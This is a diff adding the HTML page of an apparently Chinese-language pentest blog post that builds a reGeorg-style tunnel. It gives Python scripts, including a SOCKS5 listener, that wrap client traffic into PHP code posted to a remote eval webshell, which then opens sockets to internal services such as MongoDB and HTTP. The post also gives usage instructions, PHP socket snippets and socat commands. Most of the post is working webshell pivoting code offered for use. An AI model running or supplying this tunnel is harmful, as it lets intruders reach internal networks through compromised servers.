@@ -1,0 +1,561 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>PHP Eval HTTP Proxy | 😊#</title>
+  <meta name="author" content="JKme">
+  
+  <meta name="description" content="背景: linux，php环境下的reGeorg不可用。目标: 分析reGeorg的原理尝试改一下结果: 造了一个半成品，因为不能保持socks连通，可以用来访问简单的协议流数据。比如http，mongo，redis
+Protocols that are suitable to smuggle
+  HTTP based protocol:
+    Elastic, CouchDB, Mongodb, Docker
+
+  Text-based protocol:
+    FTP, SMTP, Redis, Memcached
+
+
+
+尝试1这个脚本是个残的:
+#coding: utf-8
+import socket
+import binascii
+import requests
+
+
+headers &amp;#x3D; &amp;#123;
+&amp;quot;Host&amp;quot;: &amp;quot;&amp;quot;,
+&amp;quot;Accept-Encoding&amp;quot;: &amp;quot;gzip, deflate&amp;quot;,
+&amp;quot;User-Agent&amp;quot;: &amp;quot;Mozilla&amp;#x2F;5.0 (X11; U; Linux i686; en-GB; rv:1.7.6) Gecko&amp;#x2F;20050405 Firefox&amp;#x2F;1.0 (Ubuntu package 1.0.2)&amp;quot;,
+&amp;quot;Content-Type&amp;quot;: &amp;quot;application&amp;#x2F;x-www-form-urlencoded&amp;quot;,
+&amp;quot;Connection&amp;quot;: &amp;quot;close&amp;quot;
+&amp;#125;
+
+url &amp;#x3D; &amp;quot;http:&amp;#x2F;&amp;#x2F;127.0.0.1&amp;#x2F;eval.php&amp;quot;
+s &amp;#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+s.bind((&amp;quot;127.0.0.1&amp;quot;,8889))
+s.listen(5)
+sock, addr_info &amp;#x3D; s.accept()
+
+while True:
+    print &amp;#39;Connect by &amp;#39;, addr_info
+    data &amp;#x3D; sock.recv(102400)
+    payload &amp;#x3D; &amp;#39;pass&amp;#x3D;%24res%20%3D%20fsockopen(%22127.0.0.1%22%2C27017)%3B%0A%24raw%20%3D%20hex2bin(%22&amp;#39; + hex2bin(data) + &amp;quot;%22)%3B%0Astream_set_timeout(%24res%2C5)%3B%0Astream_set_blocking(false)%3B%0Afwrite(%24res%2C%24raw)%3B%0A%24info%20%3D%20stream_get_meta_data(%24res)%3B%0Aecho%20%24info%5B&amp;#39;timed_out&amp;#39;%5D%3B%0Awhile%20(%24o%20%3Dfgets(%24res%2C5))%7B%0A%20%20%20%20%20%20%20%20if(%24o%20%3D%3D%3D%20false)%7Becho%20&amp;#39;false%20lala&amp;#39;%3B%7D%0A%24readBuff%20.%3D%20%24o%3B%0A%7D%0Aecho%20%24readBuff%3B%0Afclose(%24res)%3B&amp;quot;
+    print payload
+    data2 &amp;#x3D; requests.post(url&amp;#x3D;url,headers&amp;#x3D;headers,data&amp;#x3D;payload,proxies&amp;#x3D;&amp;#123;&amp;quot;http&amp;quot;:&amp;quot;http:&amp;#x2F;&amp;#x2F;127.0.0.1:8080&amp;quot;&amp;#125;,timeout&amp;#x3D;30).content
+    print data2
+    print &amp;quot;sending data&amp;quot;
+    sock.send(data2)
+hex2bin is available with PHP Version &amp;gt;= 5.4.0
+绑定本机的8889端口，然后mongo直接连,mongo --port 8889,如果想观察之间的流量可以这样做:
+ python mongo_proxy  &amp;#x2F;&amp;#x2F;监听8889
+socat -x -d -v tcp-listen:8888,reuseaddr,fork tcp:127.0.0.1:8889 &amp;#x2F;&amp;#x2F;流量肉眼可以看
+mongo --port 8888  &amp;#x2F;&amp;#x2F;连接8888
+发散一下，这个整体就是一个请求代理，包裹一下发送到了远程的webshell，然后webshell之行脚本。Regeorg是更通用的方式，你可以把这个脚本看作regeorg作用的子集，因为如果要访问端口之类的就需要改脚本了。
+看了看Regeorg的实现，就是接受socks5或者socks4的代理之后，发送数据包到远程服务器，过程大概是这样子的:"> 
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="PHP Eval HTTP Proxy"/>
+  <meta property="og:site_name" content="😊#"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+  <link rel="stylesheet" href="/css/prism-atom-dark.css" media="screen" type="text/css">
+    <link rel="stylesheet" href="/css/prism-line-numbers.css" media="screen" type="text/css">
+  <script src="/js/jquery-2.0.3.min.js"></script>
+<!--   <script src="/js/highlight.min.js"></script>
+  <script>hljs.highlightAll();</script>
+  <link rel="stylesheet" href="/css/highlight/styles/atom-one-dark.min.css" media="screen" type="text/css"> -->
+
+  <!-- analytics -->
+  
+
+
+
+
+<meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="😊#" type="application/atom+xml">
+</head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">😊#</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class=""></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/project" title="All the categories.">
+			  <i class=""></i>Projects
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/atom.xml" title="Subscribe me.">
+			  <i class="fa fa-rss"></i>RSS
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> PHP Eval HTTP Proxy</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <p>背景: linux，php环境下的reGeorg不可用。<br>目标: 分析reGeorg的原理尝试改一下<br>结果: 造了一个半成品，因为不能保持socks连通，可以用来访问简单的协议流数据。比如http，mongo，redis</p>
+<pre class="line-numbers language-none"><code class="language-none">Protocols that are suitable to smuggle
+  HTTP based protocol:
+    Elastic, CouchDB, Mongodb, Docker
+
+  Text-based protocol:
+    FTP, SMTP, Redis, Memcached<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<h3 id="尝试1"><a href="#尝试1" class="headerlink" title="尝试1"></a>尝试1</h3><p>这个脚本是个残的:</p>
+<pre class="line-numbers language-none"><code class="language-none">#coding: utf-8
+import socket
+import binascii
+import requests
+
+
+headers &#x3D; &#123;
+&quot;Host&quot;: &quot;&quot;,
+&quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;,
+&quot;User-Agent&quot;: &quot;Mozilla&#x2F;5.0 (X11; U; Linux i686; en-GB; rv:1.7.6) Gecko&#x2F;20050405 Firefox&#x2F;1.0 (Ubuntu package 1.0.2)&quot;,
+&quot;Content-Type&quot;: &quot;application&#x2F;x-www-form-urlencoded&quot;,
+&quot;Connection&quot;: &quot;close&quot;
+&#125;
+
+url &#x3D; &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;eval.php&quot;
+s &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+s.bind((&quot;127.0.0.1&quot;,8889))
+s.listen(5)
+sock, addr_info &#x3D; s.accept()
+
+while True:
+    print &#39;Connect by &#39;, addr_info
+    data &#x3D; sock.recv(102400)
+    payload &#x3D; &#39;pass&#x3D;%24res%20%3D%20fsockopen(%22127.0.0.1%22%2C27017)%3B%0A%24raw%20%3D%20hex2bin(%22&#39; + hex2bin(data) + &quot;%22)%3B%0Astream_set_timeout(%24res%2C5)%3B%0Astream_set_blocking(false)%3B%0Afwrite(%24res%2C%24raw)%3B%0A%24info%20%3D%20stream_get_meta_data(%24res)%3B%0Aecho%20%24info%5B&#39;timed_out&#39;%5D%3B%0Awhile%20(%24o%20%3Dfgets(%24res%2C5))%7B%0A%20%20%20%20%20%20%20%20if(%24o%20%3D%3D%3D%20false)%7Becho%20&#39;false%20lala&#39;%3B%7D%0A%24readBuff%20.%3D%20%24o%3B%0A%7D%0Aecho%20%24readBuff%3B%0Afclose(%24res)%3B&quot;
+    print payload
+    data2 &#x3D; requests.post(url&#x3D;url,headers&#x3D;headers,data&#x3D;payload,proxies&#x3D;&#123;&quot;http&quot;:&quot;http:&#x2F;&#x2F;127.0.0.1:8080&quot;&#125;,timeout&#x3D;30).content
+    print data2
+    print &quot;sending data&quot;
+    sock.send(data2)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><strong>hex2bin is available with PHP Version &gt;= 5.4.0</strong></p>
+<p>绑定本机的8889端口，然后mongo直接连,<code>mongo --port 8889</code>,如果想观察之间的流量可以这样做:</p>
+ <pre class="line-numbers language-none"><code class="language-none">python mongo_proxy  &#x2F;&#x2F;监听8889
+socat -x -d -v tcp-listen:8888,reuseaddr,fork tcp:127.0.0.1:8889 &#x2F;&#x2F;流量肉眼可以看
+mongo --port 8888  &#x2F;&#x2F;连接8888<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>发散一下，这个整体就是一个请求代理，包裹一下发送到了远程的webshell，然后webshell之行脚本。Regeorg是更通用的方式，你可以把这个脚本看作regeorg作用的<code>子集</code>，因为如果要访问端口之类的就需要改脚本了。</p>
+<p>看了看Regeorg的实现，就是接受socks5或者socks4的代理之后，发送数据包到远程服务器，过程大概是这样子的:</p>
+<pre class="line-numbers language-none"><code class="language-none">Connect: 连接之后生成一个cookie
+
+Forward: 把要请求的数据包放在cookie里面的writebuf
+
+Read: Regeorg的脚本读取writbuf的数据包之后请求接口服务，比如curl访问内网端口。然后把结果写入到cookie里面的readbuf，读取readbuf的内容
+
+Disconnect: 把cookie里面的run标志变为false，cookie就不再使用了。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>所以当Regeorg不能使用的时候，比如第一步的connect无法生成。<br>上面脚本的过程是这样子的: 我看了看regeorg的源代码，百思不得其解为什么connect没生成，调试了几天没结果。（好菜.jpg)，这个时候我发现regeorg的php原理基本就是上面的步骤。所以我就手动写脚本尝试可行。</p>
+<p>有一个不知道是什么坑的问题: 当我把ip作为变量发送到远程服务器的时候，远程服务器会出现epool_wait的错误。但是当整个脚本放在远程服务器的时候就可以运行了。</p>
+<pre class="line-numbers language-none"><code class="language-none">失败:
+
+&lt;?php
+$ip &#x3D; $_POST[&#39;ip&#39;];
+$port &#x3D; $_POST[&#39;port&#39;];
+$com &#x3D; $_POST[&#39;command&#39;];
+$payload &#x3D; $com.&#39;\r\n&#39;;
+$res &#x3D; fsockopen($ip,(int)$port,$errno, $errstr);
+&#x2F;&#x2F;$res &#x3D; stream_socket_client(&quot;tcp:&#x2F;&#x2F;127.0.0.1:6379&quot;, $errno, $errstr);
+var_dump($res);
+stream_set_timeout(1);
+stream_set_blocking(false);
+fwrite($res,$raw);
+while ($o&#x3D;fgets($res,5))&#123;
+$readbuf .&#x3D; $o;
+&#125;
+var_dump($readbuf);
+
+fclose($res);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">成功:
+
+&lt;?php
+$res &#x3D; fsockopen(&quot;127.0.0.1&quot;,6379);
+$raw &#x3D; &quot;info\r\n&quot;;
+stream_set_timeout($res,1);
+stream_set_blocking(false);
+fwrite($res,$raw);
+$info &#x3D; stream_get_meta_data($res);
+echo $info[&#39;timed_out&#39;];
+while ($o &#x3D;fgets($res,5))&#123;
+        if($o &#x3D;&#x3D;&#x3D; false)&#123;echo &#39;false lala&#39;;&#125;
+$readBuff .&#x3D; $o;
+&#125;
+var_dump($readBuff);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>所以我到了现在这一步，其实是中间发现antsword的扫描端口原理，就是包装好数据包发送到远程服务器，远程服务器做一个eval。</p>
+<p>既然是eval了，那么就是跟xss一个原理: 你有了一个”编辑器”。</p>
+<p>所以呢，再看看前面的regeorg的原理，剩下最后一步了，改造上面的脚本，让他适合proxychains。</p>
+<h3 id="尝试2"><a href="#尝试2" class="headerlink" title="尝试2"></a>尝试2</h3><pre class="line-numbers language-none"><code class="language-none"># coding: utf-8
+import socket
+import binascii
+import urllib
+import sys
+import requests
+
+VER &#x3D; &quot;\x05&quot;
+METHOD &#x3D; &quot;\x00&quot;
+SUCCESS &#x3D; &quot;\x00&quot;
+SOCKFAIL &#x3D; &quot;\x01&quot;
+NETWORKFAIL &#x3D; &quot;\x02&quot;
+HOSTFAIL &#x3D; &quot;\x04&quot;
+REFUSED &#x3D; &quot;\x05&quot;
+TTLEXPIRED &#x3D; &quot;\x06&quot;
+UNSUPPORTCMD &#x3D; &quot;\x07&quot;
+ADDRTYPEUNSPPORT &#x3D; &quot;\x08&quot;
+UNASSIGNED &#x3D; &quot;\x09&quot;
+
+
+
+def parseSocks5(sock):
+
+    nmethods, methods &#x3D; (sock.recv(1), sock.recv(1))
+    # print nmethods,methods
+    sock.sendall(VER + METHOD)
+    ver &#x3D; binascii.b2a_hex(sock.recv(1))
+    # print &quot;ver:%s &quot; % ver  #socks version: socks5 or socks4
+
+    if ver &#x3D;&#x3D; &quot;\x02&quot;:  # this is a hack for proxychains
+        ver, cmd, rsv, atyp &#x3D; (sock.recv(1), sock.recv(1), sock.recv(1), sock.recv(1))
+    else:
+        cmd, rsv, atyp &#x3D; (sock.recv(1), sock.recv(1), sock.recv(1))
+    target &#x3D; None
+    targetPort &#x3D; None
+
+    if atyp &#x3D;&#x3D; &quot;\x01&quot;:  # IPv4
+                # Reading 6 bytes for the IP and Port
+        target &#x3D; sock.recv(4)
+        targetPort &#x3D; sock.recv(2)
+        target &#x3D; &quot;.&quot; .join([str(ord(i)) for i in target])
+    elif atyp &#x3D;&#x3D; &quot;\x03&quot;:  # Hostname
+        targetLen &#x3D; ord(sock.recv(1))  # hostname length (1 byte)
+        target &#x3D; sock.recv(targetLen)
+        targetPort &#x3D; sock.recv(2)
+        target &#x3D; &quot;&quot;.join([unichr(ord(i)) for i in target])
+    elif atyp &#x3D;&#x3D; &quot;\x04&quot;:  # IPv6
+        target &#x3D; sock.recv(16)
+        targetPort &#x3D; sock.recv(2)
+        tmp_addr &#x3D; []
+        for i in xrange(len(target) &#x2F; 2):
+            tmp_addr.append(unichr(ord(target[2 * i]) * 256 + ord(target[2 * i + 1])))
+        target &#x3D; &quot;:&quot;.join(tmp_addr)
+    targetPort &#x3D; ord(targetPort[0]) * 256 + ord(targetPort[1])
+    # print targetPort
+    # print target
+
+    if cmd &#x3D;&#x3D; &quot;\x02&quot;:  # BIND
+        raise SocksCmdNotImplemented(&quot;Socks5 - BIND not implemented&quot;)
+    elif cmd &#x3D;&#x3D; &quot;\x03&quot;:  # UDP
+        raise SocksCmdNotImplemented(&quot;Socks5 - UDP not implemented&quot;)
+    elif cmd &#x3D;&#x3D; &quot;\x01&quot;:  # CONNECT
+        serverIp &#x3D; target
+        serverIp &#x3D; &quot;&quot;.join([chr(int(i)) for i in serverIp.split(&quot;.&quot;)])
+
+    sock.sendall(VER + SUCCESS + &quot;\x00&quot; + &quot;\x01&quot; + serverIp + chr(targetPort &#x2F; 256) + chr(targetPort % 256))
+    # print &quot;recv: %s&quot; % binascii.b2a_hex(sock.recv(1024))
+    return target,targetPort
+
+
+def sendPayload(sock,flag&#x3D;&#39;&#39;):
+    print &quot;[Prepare Payload]&quot;
+    try:
+        data &#x3D; sock.recv(20480)
+    except:
+        print &quot;Closing Proxy&quot;
+        s.close()
+        exit(0)
+
+    if data:
+        print &quot;&lt;&lt; Recving Data From Client&quot;
+        tmp_payload &#x3D; &quot;$res &#x3D; fsockopen(&#39;%s&#39;,%s);&quot; % (target, targetPort)
+        tmp_payload +&#x3D; &quot;$raw &#x3D; hex2bin(&#39;&quot; + binascii.b2a_hex(flag+data) + &quot;&#39;);&quot;
+        tmp_payload +&#x3D; &quot;stream_set_timeout($res,1);&quot;
+        # tmp_payload +&#x3D; &quot;stream_set_blocking(true);&quot;
+        tmp_payload +&#x3D; &quot;fwrite($res,$raw);&quot;
+        tmp_payload +&#x3D; &quot;while ($o &#x3D;fgets($res,100))&#123;if($o &#x3D;&#x3D;&#x3D; false)&#123;echo &#39;Connect Failed&#39;;&#125;&quot;
+        tmp_payload +&#x3D; &quot;$readBuff .&#x3D; $o;&#125;&quot;
+        tmp_payload +&#x3D; &quot;echo $readBuff;&quot;
+        tmp_payload +&#x3D; &quot;fclose($res);&quot;
+        # print tmp_payload
+        payload &#x3D; urllib.quote(tmp_payload)
+        # print &quot;The payload is: %s&quot; %payload
+        shell &#x3D; sys.argv[1]
+        p &#x3D; sys.argv[2]
+        exp &#x3D; &quot;%s&#x3D;%s&quot; % (p, payload)
+        content &#x3D; requests.post(shell, data&#x3D;exp, proxies&#x3D;&#123;&quot;http&quot;: &quot;http:&#x2F;&#x2F;127.0.0.1:8080&quot;&#125;,
+                                headers&#x3D;&#123;&quot;Content-Type&quot;: &quot;application&#x2F;x-www-form-urlencoded&quot;&#125;).content
+        sock.send(content)
+        print &quot;&gt;&gt; Sending Data to Client&quot;
+        flag2 &#x3D; sock.recv(1)
+        while flag2:
+            sendPayload(sock,flag2)
+        # else:
+        #     s.close()
+        #     exit(0)
+        # # s.close()
+    else:
+        pass
+
+s &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 2)
+s.bind((&quot;127.0.0.1&quot;, 9999))
+s.listen(5)
+
+
+while 1:
+    try:
+        sock, addr_info &#x3D; s.accept()
+        print &quot;[Accept Bytes]&quot;
+        flag &#x3D; sock.recv(1)
+
+        if flag &#x3D;&#x3D; &quot;\x05&quot;:
+            target, targetPort &#x3D; parseSocks5(sock)
+            sendPayload(sock)
+        else:
+            sendPayload(sock,flag)
+    except KeyboardInterrupt:
+        exit(0)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>使用方法: <code>python rego.py &lt;webshell&gt; &lt;webshell&#39;s pass&gt;</code> </p>
+<p>这个很烂的单线程代码实现了这样的功能:</p>
+<ol>
+<li>开启一个本地的9999的socks5代理</li>
+<li>使用这个代理可以用curl访问内网web服务</li>
+<li>可以访问这些数据库，mongo可用</li>
+<li>使用了8080作为代理，放在burp里面看流量</li>
+</ol>
+<p>有这样的缺点:</p>
+<ol>
+<li>curl访问web和访问mongo只能选一个(比如开了两个窗口，一个访问http，一个访问mongo)</li>
+<li>速度很慢，取决于实际环境，自己调timeout</li>
+<li>ssh或者mysql不能用，因为没有保持socks连接。</li>
+</ol>
+<p>为什么reGeorg就可以？因为reGeorg用<code>while true</code>循环保持了socks连接，通过写入cookie的数据进行交互。</p>
+<p>测试主要使用了socat转发流量:</p>
+<pre class="line-numbers language-none"><code class="language-none">socat -x -d -v tcp-listen:8888,reuseaddr,fork tcp:127.0.0.1:8889
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="END"><a href="#END" class="headerlink" title="END"></a>END</h3><p>测试了下redis不可用，因为默认redis使用的是RESP的协议。</p>
+
+	  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+
+	</div>
+
+	
+	<span id="/2019/10/23/php-eval-proxy.html" class="leancloud-visitors view" data-flag-title="PHP Eval HTTP Proxy">
+		<em class="post-meta-item-text"> Page View </em> <i class="leancloud-visitors-count"></i>
+	</span>
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a href="/2019/12/13/python-debug.html" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2019/10/23/winrm.html" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2019-10-23 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/Pentest/">Pentest<span>42</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
+	   <div id="toc" class="toc collapse in">
+		   <span class="toc-title">Contents</span>
+			<ol class="toc-article"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%B0%9D%E8%AF%951"><span class="toc-article-text">尝试1</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%B0%9D%E8%AF%952"><span class="toc-article-text">尝试2</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#END"><span class="toc-article-text">END</span></a></li></ol>
+		</div>
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2022 JKme's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
